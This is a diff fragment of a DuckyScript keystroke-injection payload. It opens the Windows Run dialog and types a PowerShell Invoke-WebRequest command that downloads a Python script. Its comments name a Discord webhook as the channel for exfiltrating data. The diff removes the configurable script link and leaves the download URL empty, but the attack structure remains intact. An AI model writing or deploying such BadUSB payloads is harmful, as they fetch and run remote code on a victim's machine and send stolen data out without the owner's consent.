@@ -14,10 +14,6 @@ REM     - Internet Connection
 REM     - Discord Webhook (or whatever you want for the exfiltration)
 
 
-REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK example.com
-
-
 DELAY 1000
 GUI r
 DELAY 1000
@@ -26,9 +22,7 @@ ENTER
 DELAY 2000
 
 
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
+STRING Invoke-WebRequest -Uri "" -OutFile "script.py"
 ENTER
 DELAY 2000
 
